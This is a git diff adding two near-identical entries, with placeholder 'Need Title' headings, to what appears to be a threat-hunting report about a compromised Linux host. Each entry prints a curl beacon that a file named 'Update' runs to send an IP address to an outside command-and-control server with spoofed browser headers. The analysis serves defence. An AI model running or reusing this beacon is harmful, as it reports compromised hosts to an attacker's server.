@@ -239,7 +239,61 @@ file named `.bisis` was created and was tagged as PUA.Portscan commonly used for
 
 ---
 
+#### March 8 2025 - *Need Title*
 
+**Device Involved:**
+- `linux-programatic-ajs`
+
+**Activity:**
+The same `linux-programatic-ajs` device displayed suspsicious activity with a command that silently sends a device's IP address to a remote server (`196.251.73.38:47`) via a crafted HTTP request using `curl`. It disguises the traffic as a legitimate browser request by adding typical headers. The use of --insecure bypasses SSL certificate validation, and the activity likely functions as a beacon — reporting the infected system’s presence back to a command-and-control (C2) server. It used IP `103.108.140.172` as the parameters. As you can see the `Update` file created and executed this curl script.
+
+```kql
+curl --silent "http://196.251.73.38:47/save-data?IP=103.108.140.172" 
+  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" 
+  -H "Accept-Language: en-US,en;q=0.9" 
+  -H "Cache-Control: max-age=0" 
+  -H "Connection: keep-alive" 
+  -H "Upgrade-Insecure-Requests: 1" 
+  --insecure
+```
+
+<p align="center">  
+  <img src="https://github.com/user-attachments/assets/f780335a-18a6-4043-863c-23c756c3439b" alt="Detailed Process Timeline" width="700"/>
+</p>
+
+**VirusTotal Scores:**
+- `Update`: ****
+- `196.251.73.38:47`: **N/A**
+- `103.108.140.172`: **N/A**
+
+---
+
+#### March 14 - 17 2025 - *Need Title*
+
+**Device Involved:**
+- `linux-programatic-ajs`
+
+**Activity:**
+The same `linux-programatic-ajs` device displayed suspsicious activity with a command that silently sends a device's IP address to a remote server (`196.251.73.38:47`) via a crafted HTTP request using `curl`. It disguises the traffic as a legitimate browser request by adding typical headers. The use of --insecure bypasses SSL certificate validation, and the activity likely functions as a beacon — reporting the infected system’s presence back to a command-and-control (C2) server. It used IP `103.108.140.172` as the parameters. As you can see the `Update` file created and executed this curl script.
+
+```kql
+curl --silent "http://196.251.73.38:47/save-data?IP=103.108.140.172" 
+  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" 
+  -H "Accept-Language: en-US,en;q=0.9" 
+  -H "Cache-Control: max-age=0" 
+  -H "Connection: keep-alive" 
+  -H "Upgrade-Insecure-Requests: 1" 
+  --insecure
+```
+
+<p align="center">  
+  <img src="https://github.com/user-attachments/assets/f780335a-18a6-4043-863c-23c756c3439b" alt="Detailed Process Timeline" width="700"/>
+</p>
+
+**VirusTotal Scores:**
+- `Update`: ****
+- `196.251.73.38:47`: **N/A**
+- `103.108.140.172`: **N/A**
 
 
 
